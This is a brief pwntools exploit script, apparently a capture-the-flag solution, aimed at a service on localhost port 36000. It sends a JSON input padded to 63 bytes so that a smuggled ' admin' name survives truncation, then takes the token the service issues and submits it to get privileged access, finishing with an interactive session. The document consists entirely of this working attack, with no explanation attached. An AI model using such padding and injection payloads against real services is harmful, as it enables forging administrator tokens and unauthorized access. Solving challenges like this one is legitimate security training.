from pwn import *

p = remote("localhost", 36000)

p.sendlineafter(b"choice", b"1")
p.sendlineafter(b"input", b'{"name":'.ljust(63)+b'" admin"}')
p.recvuntil(b"Token:")
token = p.recvline().strip()
p.sendlineafter(b"choice", b"2")
p.sendlineafter(b"token", token)

print(token)

p.interactive()